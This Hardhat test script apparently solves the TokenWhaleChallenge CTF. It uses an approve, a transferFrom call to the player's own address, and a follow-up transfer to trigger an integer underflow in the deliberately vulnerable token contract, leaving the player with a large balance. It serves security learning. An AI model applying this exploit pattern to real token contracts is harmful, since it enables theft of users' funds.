import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenWhaleChallenge", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployFixture() {
    // Contracts are deployed using the first signer/account by default
    const [player, otherAccount] = await ethers.getSigners();

    const TokenWhaleChallenge = await ethers.getContractFactory("TokenWhaleChallenge");
    const token = await TokenWhaleChallenge.deploy(player.address);

    return { token, player, otherAccount };
  }

  describe("Challenge", function () {
    it("Should allow player to accumulate tokens", async function () {
      const { token, player, otherAccount } = await loadFixture(deployFixture);
      const initResult = await token.isComplete();
      console.log("init result: ", initResult);

      await token.approve(otherAccount.address, "1000000");
      await token.connect(otherAccount).transferFrom(player.address, player.address, "1");
      await token.connect(otherAccount).transfer(player.address, "1000000");

      const result = await token.isComplete();
      console.log("result: ", result);
    });
  });
});
